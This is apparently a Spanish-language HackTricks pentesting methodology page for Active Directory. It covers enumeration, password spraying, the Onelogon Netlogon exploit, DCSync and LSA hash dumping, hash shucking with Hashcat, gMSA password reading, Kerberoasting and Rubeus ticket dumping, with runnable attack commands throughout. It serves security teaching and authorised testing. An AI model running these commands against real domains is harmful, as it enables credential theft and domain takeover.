# Metodología de Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Descripción general básica

**Active Directory** es una tecnología fundamental que permite a los **administradores de red** crear y gestionar eficientemente **dominios**, **usuarios** y **objetos** dentro de una red. Está diseñado para escalar y facilitar la organización de una gran cantidad de usuarios en **grupos** y **subgrupos** manejables, a la vez que controla los **derechos de acceso** en distintos niveles.

La estructura de **Active Directory** consta de tres capas principales: **dominios**, **árboles** y **bosques**. Un **dominio** abarca una colección de objetos, como **usuarios** o **dispositivos**, que comparten una base de datos. Los **árboles** son grupos de estos dominios vinculados por una estructura común, y un **bosque** representa una colección de varios árboles, interconectados mediante **relaciones de confianza**, que forman la capa más alta de la estructura organizativa. En cada uno de estos niveles se pueden asignar **derechos de acceso** y **comunicación** específicos.

Entre los conceptos clave de **Active Directory** se incluyen:

1. **Directorio** – Contiene toda la información relacionada con los objetos de Active Directory.
2. **Objeto** – Designa entidades del directorio, como **usuarios**, **grupos** o **carpetas compartidas**.
3. **Dominio** – Sirve como contenedor de objetos del directorio. En un **bosque** pueden coexistir varios dominios, cada uno con su propia colección de objetos.
4. **Árbol** – Agrupación de dominios que comparten un dominio raíz.
5. **Bosque** – El nivel más alto de la estructura organizativa de Active Directory, compuesto por varios árboles con **relaciones de confianza** entre ellos.

**Active Directory Domain Services (AD DS)** abarca diversos servicios esenciales para la gestión centralizada y la comunicación dentro de una red. Estos servicios incluyen:

1. **Servicios de dominio** – Centraliza el almacenamiento de datos y gestiona las interacciones entre **usuarios** y **dominios**, incluidas las funciones de **autenticación** y **búsqueda**.
2. **Servicios de certificados** – Gestiona la creación, distribución y administración de **certificados digitales** seguros.
3. **Servicios de directorio ligero** – Admite aplicaciones habilitadas para directorios mediante el **protocolo LDAP**.
4. **Servicios de federación de directorios** – Proporciona capacidades de **inicio de sesión único** para autenticar usuarios en varias aplicaciones web durante una sola sesión.
5. **Administración de derechos** – Ayuda a proteger material con derechos de autor al regular su distribución y uso no autorizados.
6. **Servicio DNS** – Esencial para la resolución de **nombres de dominio**.

Para una explicación más detallada, consulta: [**TechTerms - Definición de Active Directory**](https://techterms.com/definition/active_directory)

### **Autenticación Kerberos**

Para aprender a **atacar un AD**, necesitas **entender** muy bien el **proceso de autenticación Kerberos**.\
[**Lee esta página si todavía no sabes cómo funciona.**](kerberos-authentication.md)

## Hoja de trucos

Puedes consultar [https://wadcoms.github.io/](https://wadcoms.github.io) para ver rápidamente qué comandos puedes ejecutar para enumerar/explotar un AD.

> [!WARNING]
> La comunicación Kerberos normalmente **requiere un nombre de dominio completo (FQDN)** para que el cliente pueda obtener un ticket para el SPN correcto. El acceso a una máquina mediante su dirección IP suele recurrir a NTLM en lugar de Kerberos.

## Recon de Active Directory (sin credenciales/sesiones)

Si solo tienes acceso a un entorno AD, pero no tienes credenciales/sesiones, podrías:

- **Hacer pentest de la red:**
  - Escanea la red, encuentra máquinas y puertos abiertos e intenta **explotar vulnerabilidades** u **obtener credenciales** de ellas (por ejemplo, [las impresoras pueden ser objetivos muy interesantes](ad-information-in-printers.md)).
  - La enumeración de DNS podría revelar información sobre servidores clave del dominio, como servidores web, impresoras, recursos compartidos, VPN, medios, etc.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Consulta la [**metodología general de pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) para obtener más información sobre cómo hacerlo.
- **Comprueba si hay acceso null o Guest a servicios SMB** (esto no funcionará en versiones modernas de Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Aquí encontrarás una guía más detallada sobre cómo enumerar un servidor SMB:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumera LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Aquí encontrarás una guía más detallada sobre cómo enumerar LDAP (presta **especial atención al acceso anónimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Envenena la red**
  - Obtén credenciales [**suplantando servicios con Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Accede al host [**abusando del relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Obtén credenciales **exponiendo** [**servicios UPnP falsos con evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Extrae nombres de usuario/nombres de documentos internos, redes sociales y servicios (principalmente web) dentro de los entornos del dominio, así como de fuentes de acceso público.
  - Si encuentras los nombres completos de empleados de la empresa, podrías probar distintas **convenciones de nombres de usuario** de AD ([**lee esto**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Las convenciones más comunes son: _NombreApellido_, _Nombre.Apellido_, _NomApe_ (3 letras de cada uno), _Nom.Ape_, _NApellido_, _N.Apellido_, _ApellidoNombre_, _Apellido.Nombre_, _ApellidoN_, _Apellido.N_, 3 _letras aleatorias y 3 números aleatorios_ (abc123).
  - Herramientas:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeración de usuarios

- **Enumeración anónima de SMB/LDAP:** Consulta las páginas de [**pentesting de SMB**](../../network-services-pentesting/pentesting-smb/index.html) y [**pentesting de LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeración con Kerbrute**: Cuando se **solicita un nombre de usuario no válido**, el servidor responde con el código de error de **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, lo que nos permite determinar que el nombre de usuario no era válido. Los **nombres de usuario válidos** provocarán una respuesta **TGT en un AS-REP** o el error _KRB5KDC_ERR_PREAUTH_REQUIRED_, que indica que el usuario debe realizar la preautenticación.
- **Sin autenticación contra MS-NRPC**: Se usa auth-level = 1 (sin autenticación) contra la interfaz MS-NRPC (Netlogon) de los controladores de dominio. El método llama a la función `DsrGetDcNameEx2` después de enlazarse a la interfaz MS-NRPC para comprobar si el usuario o equipo existe sin credenciales. La herramienta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa este tipo de enumeración. La investigación se encuentra [aquí](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **Servidor OWA (Outlook Web Access)**

Si encontraste uno de estos servidores en la red, también puedes realizar **user enumeration contra él**. Por ejemplo, podrías usar la herramienta [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Puedes encontrar listas de nombres de usuario en [**este repositorio de github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) y en este otro ([**nombres de usuario estadísticamente probables**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Sin embargo, deberías tener **los nombres de las personas que trabajan en la empresa** a partir del paso de recon que deberías haber realizado antes. Con el nombre y el apellido, podrías usar el script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para generar posibles nombres de usuario válidos.

### Abuso de la lista de permitidos del canal vulnerable de Netlogon (Onelogon)

Incluso después de aplicar el parche de **Zerologon** en el DC, las cuentas incluidas explícitamente en la lista de permitidos pueden seguir expuestas al **comportamiento vulnerable/legado del canal seguro de Netlogon**. La configuración de riesgo es la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** o el valor de registro correspondiente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ese valor es un **descriptor de seguridad SDDL** (consulta [Security Descriptors](security-descriptors.md)). Cualquier cuenta o grupo al que se le conceda la ACE pertinente en la DACL puede ser objeto de ataque. Por ejemplo, `O:BAG:BAD:(A;;RC;;;WD)` incluye efectivamente a **Everyone** en la lista de permitidos.

Flujo de trabajo práctico para el operador:

1. **Identifica los principales incluidos en la lista de permitidos** comprobando tanto **SYSVOL/GPO** como el **registro activo del DC**.
2. **Resuelve los SID** encontrados en el SDDL para identificar los usuarios/equipos reales de AD y da prioridad a las **cuentas de máquina de DC**, las **cuentas de confianza** y otras máquinas privilegiadas.
3. Intenta repetidamente la **autenticación MS-NRPC / Netlogon** como la cuenta incluida en la lista de permitidos.
4. Tras acertar, abusa de la **configuración de contraseñas de Netlogon** para restablecer la contraseña de la cuenta objetivo (el PoC público la establece como una cadena vacía).<sup>[[9]](#references)[[10]](#references)</sup>

Ejemplos rápidos de triaje / laboratorio del artefacto público:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notas:

- El **scanner** es útil porque la allow-list efectiva puede estar en **SYSVOL**, en el **registro** o en ambos.
- La ruta del exploit es importante porque **no requiere privilegios de Domain Admin** una vez identificada una cuenta vulnerable.
- Comprometer una **cuenta de equipo de un Domain Controller**, como `DC$`, es especialmente peligroso, ya que restablecer esa contraseña puede habilitar directamente otras vías para tomar el control de **AD**.
- La viabilidad de la **fuerza bruta** depende del modo: el artefacto público describe un enfoque meet-in-the-middle, una **fuerza bruta de 24 bits** cuando se dispone de otra cuenta de equipo y variantes más lentas de **32 bits**.

Notas de detección y hardening:

- Audita la política de allow-list y elimina todo, excepto las excepciones de compatibilidad temporales y requeridas explícitamente.
- Supervisa los eventos **5827/5828/5829/5830/5831** del **System** de los DC para detectar conexiones Netlogon vulnerables que se deniegan, descubren o permiten explícitamente mediante la política.
- Trata las cuentas de `VulnerableChannelAllowList` como de **alto riesgo** hasta eliminar la dependencia heredada.

### Conocer uno o varios nombres de usuario

Bien, ya sabes que tienes un nombre de usuario válido, pero ninguna contraseña... Entonces, prueba lo siguiente:

- [**ASREPRoast**](asreproast.md): Si un usuario **no tiene** el atributo _DONT_REQ_PREAUTH_, puedes **solicitar un mensaje AS_REP** para ese usuario, que contendrá datos cifrados mediante una derivación de la contraseña del usuario.
- [**Password Spraying**](password-spraying.md): Probemos las contraseñas más **comunes** con cada uno de los usuarios descubiertos; quizá algún usuario use una contraseña débil (¡ten en cuenta la política de contraseñas!).
  - Ten en cuenta que también puedes hacer **spraying a servidores OWA** para intentar acceder a los servidores de correo de los usuarios.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Quizá puedas **obtener** algunos **hashes** de desafío si haces **poisoning** de algunos protocolos de la **red**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

La enumeración de Active Directory proporciona nombres de usuario, identificadores de correo electrónico y patrones de nomenclatura, hosts candidatos y servicios que podrían ser forzados a autenticarse. Usa ese contexto para identificar posibles [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) de NTLM y posibles vías de acceso al entorno de AD.

### Recon y comprobaciones de la postura de relay con workspaces de NetExec

- Usa **workspaces de `nxcdb`** para mantener el estado del reconocimiento de AD separado por engagement: `workspace create <name>` crea bases de datos SQLite por protocolo en `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia de vista con `proto smb|mssql|winrm` y enumera los secretos recopilados con `creds`. Al terminar, elimina manualmente los datos sensibles: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- La detección rápida de subredes con **`netexec smb <cidr>`** muestra el **dominio**, la **versión del SO**, los **requisitos de SMB signing** y **Null Auth**. Los equipos que muestran `(signing:False)` son **vulnerables a relay**, mientras que los DC suelen exigir signing.
- Genera **nombres de host en /etc/hosts** directamente a partir de la salida de NetExec para facilitar el targeting:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Cuando **SMB relay al DC está bloqueado** por signing, aun así comprueba la postura de **LDAP**: `netexec ldap <dc>` destaca `(signing:None)` / channel binding débil. Un DC que requiere SMB signing pero tiene LDAP signing deshabilitado sigue siendo un objetivo viable de **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Client-side printer credential leaks → validación masiva de credenciales del dominio

- Las interfaces web/de impresoras a veces **incluyen contraseñas de administrador enmascaradas en HTML**. Ver el código fuente o usar devtools puede revelar el texto sin cifrar (p. ej., `<input value="<password>">`), lo que permite acceso con Basic-auth para escanear repositorios de impresión.
- Los trabajos de impresión recuperados pueden contener **documentos de incorporación en texto sin cifrar** con contraseñas de cada usuario. Mantén las correspondencias alineadas al hacer las pruebas:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Robar credenciales NTLM

Si puedes **acceder a otros equipos o recursos compartidos** con el **usuario null o guest**, podrías **colocar archivos** (como un archivo SCF) que, si alguien accede a ellos, **desencadenarán una autenticación NTLM contra ti** para que puedas **robar** el **desafío NTLM** y descifrarlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata cada hash NT que ya posees como una contraseña candidata para otros formatos más lentos cuyo material de clave se deriva directamente del hash NT. En lugar de aplicar fuerza bruta a frases de contraseña largas en tickets Kerberos RC4, desafíos NetNTLM o credenciales almacenadas en caché, introduces los hashes NT en los modos NT-candidate de Hashcat y dejas que valide la reutilización de contraseñas sin que tengas que conocer el texto plano. Esto es especialmente eficaz tras comprometer un dominio, cuando puedes recolectar miles de hashes NT actuales e históricos.<sup>[[5]](#references)</sup>

Usa shucking cuando:

- Tienes un corpus de NT obtenido mediante DCSync, volcados de SAM/SECURITY o bóvedas de credenciales y necesitas comprobar si se reutiliza en otros dominios/bosques.
- Capturas material Kerberos basado en RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respuestas NetNTLM o blobs DCC/DCC2.
- Quieres demostrar rápidamente la reutilización de frases de contraseña largas e imposibles de descifrar y pivotar de inmediato mediante Pass-the-Hash.

La técnica **no funciona** contra tipos de cifrado cuyas claves no son el hash NT (p. ej., Kerberos etype 17/18 AES). Si un dominio exige únicamente AES, debes volver a los modos habituales para contraseñas.

#### Crear un corpus de hashes NT

- **DCSync/NTDS** – Usa `secretsdump.py` con el historial para obtener el conjunto más grande posible de hashes NT (y sus valores anteriores):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Las entradas del historial amplían considerablemente el conjunto de candidatos, porque Microsoft puede almacenar hasta 24 hashes anteriores por cuenta. Para ver más formas de obtener secretos de NTDS, consulta:

{{#ref}}
dcsync.md
{{#endref}}

- **Volcados de caché de endpoints** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) extrae datos locales de SAM/SECURITY e inicios de sesión de dominio almacenados en caché (DCC/DCC2). Elimina los duplicados y añade esos hashes a la misma lista `nt_candidates.txt`.
- **Seguimiento de metadatos** – Conserva el nombre de usuario/dominio que produjo cada hash (aunque la wordlist solo contenga valores hexadecimales). Cuando Hashcat muestre la candidata ganadora, los hashes coincidentes te indicarán de inmediato qué principal está reutilizando una contraseña.
- Prioriza candidatos del mismo forest o de un forest de confianza; esto maximiza la probabilidad de coincidencias al hacer shucking.

#### Modos de NT-candidate de Hashcat

| Tipo de hash                             | Modo de contraseña | Modo de NT-candidate |
| ---------------------------------------- | ------------------ | ------------------- |
| Domain Cached Credentials (DCC)          | 1100               | 31500               |
| Domain Cached Credentials 2 (DCC2)       | 2100               | 31600               |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500               | 27000               |
| NetNTLMv2                                | 5600               | 27100               |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500               | _N/A_               |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100              | 35300               |
| Kerberos 5 etype 23 AS-REP               | 18200              | 35400               |

Notas:

- Las entradas de NT-candidate **deben seguir siendo hashes NT sin procesar de 32 caracteres hexadecimales**. Desactiva los motores de reglas (sin `-r` ni modos híbridos), porque las modificaciones corrompen el material de clave candidato.
- Estos modos no son intrínsecamente más rápidos, pero el espacio de claves de NTLM (~30,000 MH/s en un M3 Max) es ~100 veces más rápido que Kerberos RC4 (~300 MH/s). Probar una lista de NT seleccionada es mucho más barato que explorar todo el espacio de contraseñas en el formato lento.
- Usa siempre la **versión más reciente de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), porque los modos 31500/31600/35300/35400 se incorporaron hace poco.<sup>[[7]](#references)</sup>
- Actualmente no hay un modo NT para AS-REQ Pre-Auth, y los etypes AES (19600/19700) requieren la contraseña en texto plano, porque sus claves se derivan mediante PBKDF2 a partir de contraseñas UTF-16LE, no de hashes NT sin procesar.

#### Ejemplo – Kerberoast RC4 (modo 35300)

1. Captura un TGS RC4 para un SPN objetivo usando un usuario con pocos privilegios (consulta la página de Kerberoast para más detalles):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Extrae el ticket con tu lista NT:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat deriva la clave RC4 de cada candidato NT y valida el blob `$krb5tgs$23$...`. Una coincidencia confirma que la cuenta de servicio usa uno de tus hashes NT existentes.

3. Pivota inmediatamente mediante PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Puedes recuperar opcionalmente el texto plano más adelante con `hashcat -m 1000 <matched_hash> wordlists/` si es necesario.

#### Ejemplo – credenciales en caché (mode 31600)

1. Dump de los inicios de sesión en caché de una estación de trabajo comprometida:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Copia la línea DCC2 del usuario interesante del dominio en `dcc2_highpriv.txt` y hazle shuck:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Una coincidencia exitosa devuelve el hash NT que ya conoces y tienes en tu lista, lo que demuestra que el usuario en caché está reutilizando una contraseña. Úsalo directamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) o hazle brute-force en modo NTLM rápido para recuperar la cadena.

El mismo flujo de trabajo se aplica a las respuestas a desafíos NetNTLM (`-m 27000/27100`) y a DCC (`-m 31500`). Una vez identificada una coincidencia, puedes lanzar un relay, PtH mediante SMB/WMI/WinRM o volver a crackear el hash NT sin conexión con máscaras o reglas.



## Enumeración de Active Directory CON credenciales/sesión

Para esta fase, necesitas haber **comprometido las credenciales o una sesión de una cuenta de dominio válida.** Si tienes credenciales válidas o una shell como usuario de dominio, **debes recordar que las opciones mencionadas anteriormente siguen siendo opciones para comprometer a otros usuarios**.

Antes de comenzar la enumeración autenticada, comprende el **problema del doble salto de Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeración

Comprometer una cuenta es un **paso importante para evaluar el dominio**, porque permite realizar la **enumeración de Active Directory** autenticada:

En cuanto a [**ASREPRoast**](asreproast.md), ahora puedes encontrar todos los usuarios potencialmente vulnerables; y, respecto a [**Password Spraying**](password-spraying.md), puedes obtener una **lista de todos los nombres de usuario** y probar la contraseña de la cuenta comprometida, contraseñas vacías y nuevas contraseñas prometedoras.

- Puedes usar [**CMD para realizar un reconocimiento básico**](../basic-cmd-for-pentesters.md#domain-info)
- También puedes usar [**PowerShell para hacer recon**](../basic-powershell-for-pentesters/index.html), que será más sigiloso
- También puedes [**usar powerview**](../basic-powershell-for-pentesters/powerview.md) para extraer información más detallada
- Otra herramienta increíble para hacer recon en un Active Directory es [**BloodHound**](bloodhound.md). **No es muy sigilosa** (depende de los métodos de recopilación que uses), pero **si eso no te preocupa**, definitivamente deberías probarla. Averigua dónde pueden usar RDP los usuarios, encuentra rutas a otros grupos, etc.
  - **Otras herramientas automatizadas de enumeración de AD son:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Registros DNS de AD**](ad-dns-records.md), ya que podrían contener información interesante.
- Una **herramienta con GUI** que puedes usar para enumerar el directorio es **AdExplorer.exe**, de **SysInternal** Suite.
- También puedes buscar en la base de datos LDAP con **ldapsearch** para encontrar credenciales en los campos _userPassword_ y _unixUserPassword_, o incluso en las notas _description_ e _info_ de los usuarios. Un token sin etiqueta en _info_ que tenga aspecto de contraseña es solo un posible candidato: confirma por separado su propósito y validez, y evita incluir el contenido de las notas en la salida de enumeración rutinaria. Consulta [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para ver otros métodos.
- Revisa los scripts **accesibles** de inicio de sesión de dominio y asignación de unidades en `\\<dc>\NETLOGON` o `\\<dc>\SYSVOL\<domain>\scripts` cuando tengas autorización. [Microsoft documenta](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) la función del directorio de scripts del recurso compartido NETLOGON. Primero enumera los nombres y luego inspecciona solo los scripts relevantes y legibles, respetando un límite de tamaño; no vuelques todo el recurso compartido ni muestres valores de credenciales durante la enumeración rutinaria. Una llamada de PowerShell a [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **no protege** una contraseña literal almacenada en el script. La llamada por sí sola no demuestra que haya un secreto codificado en el script: rastrea la entrada real y, por separado, verifica la cuenta, la validez de las credenciales y los privilegios. Revisar un script de dominio en un recurso compartido remoto es una tarea distinta de enumerar un host local.
- Si usas **Linux**, también puedes enumerar el dominio con [**pywerview**](https://github.com/the-useless-one/pywerview).
- También puedes probar herramientas automatizadas como:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraer todos los usuarios del dominio**

  Es muy fácil obtener todos los nombres de usuario del dominio desde Windows (`net user /domain` ,`Get-DomainUser` o `wmic useraccount get name,sid`). En Linux, puedes usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Aunque esta sección de enumeración parezca breve, es la parte más importante de todas. Abre los enlaces (principalmente los de cmd, powershell, powerview y BloodHound), aprende a enumerar un dominio y practica hasta que te sientas cómodo. Durante una evaluación, este será el momento clave para encontrar el camino hacia DA o decidir que no se puede hacer nada.

### Cuentas de equipo precreadas predecibles -> acceso a contraseñas gMSA

Las cuentas de equipo preparadas para uniones heredadas pueden conservar una contraseña inicial predecible. El módulo `pre2k` de NetExec identifica el valor característico `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) e intenta obtener un TGT de Kerberos usando los primeros 14 caracteres del nombre de equipo en minúsculas, sin el `$` final. Considera este valor de UAC un selector de posibles candidatos, en lugar de asumir que pertenecer a **Pre-Windows 2000 Compatible Access** demuestra por sí solo que la contraseña es débil.<sup>[[18]](#references)[[20]](#references)</sup>

Usa la enumeración LDAP autenticada para probar los candidatos y guardar los TGT obtenidos con éxito. `ALL=True` amplía las pruebas a objetos que no coincidan con el filtro predeterminado `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Un bind predeterminado/NTLM fallido **no** invalida este hallazgo: prueba con `-k`, un FQDN que resuelva a DC y un reloj sincronizado con el KDC. Las ejecuciones correctas del módulo escriben listas de candidatos y ccaches adquiridos en `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Después de comprometer el principal de equipo, analiza sus pertenencias a grupos anidados y sus permisos salientes. En particular, los principales nombrados en el descriptor de seguridad `msDS-GroupMSAMembership` de una gMSA pueden leer `msDS-ManagedPassword`; la salida `--gmsa` de NetExec muestra los principales autorizados y devuelve el hash NT actual cuando el equipo que se autentica está autorizado.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Luego evalúa la gMSA recuperada como cualquier otra credencial: inspecciona la pertenencia a grupos locales/del dominio, los derechos de inicio de sesión, los SPN, la delegación y los servicios accesibles antes de intentar pass-the-hash. Esta vía de recuperación basada en ACL es distinta de [Golden gMSA/dMSA](golden-dmsa-gmsa.md), que deriva contraseñas administradas tras comprometer la clave raíz de KDS.<sup>[[20]](#references)</sup>

Un principal de equipo también puede tener control saliente sobre otros objetos de equipo o grupos. Tras obtener uno, inspecciona por separado sus pertenencias anidadas y sus ACL efectivas: un permiso de escritura en otro objeto de equipo puede permitir cambiar una cuenta, y los permisos de pertenencia a grupos pueden otorgar un rol de inicio de sesión. Un indicador de cuenta preparada, una convención de nombres predecible o una relación `GenericWrite` por sí solos no demuestran la ruta completa.

Una copia legible de un blob `msDS-ManagedPassword` en un archivo, recurso compartido o copia de seguridad constituye una vía de exposición independiente: la ACL de lectura de LDAP no puede proteger una copia almacenada en otro lugar. Valida que los datos sean un blob de contraseña administrada antes de interpretarlos y distingue esta situación tanto de una lectura autorizada de LDAP como de la derivación mediante la clave raíz de KDS.

### Kerberoast

Kerberoasting consiste en obtener **tickets TGS** utilizados por servicios vinculados a cuentas de usuario y crackear su cifrado —basado en contraseñas de usuario— **offline**.

Más información al respecto:


{{#ref}}
kerberoast.md
{{#endref}}

### Conexión remota (RDP, SSH, FTP, Win-RM, etc.)

Una vez que hayas obtenido algunas credenciales, puedes comprobar si tienes acceso a alguna **máquina**. Para ello, puedes usar **CrackMapExec** para intentar conectarte a varios servidores mediante distintos protocolos, según los escaneos de puertos que hayas realizado.

### Escalada local de privilegios

Si has comprometido credenciales o una sesión como usuario normal del dominio y puedes acceder a **cualquier máquina del dominio**, busca una ruta para **escalar privilegios localmente y recopilar credenciales**. Los privilegios de administrador local pueden permitirte **volcar los hashes de otros usuarios** desde la memoria (LSASS) y el almacenamiento local (SAM).

En este libro hay una página completa sobre la [**escalada local de privilegios en Windows**](../windows-local-privilege-escalation/index.html) y una [**lista de comprobación**](../checklist-windows-privilege-escalation.md). Además, no olvides usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets de la sesión actual

Es muy **improbable** que encuentres **tickets** en el usuario actual que **te den permiso para acceder** a recursos inesperados, pero puedes comprobarlo:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

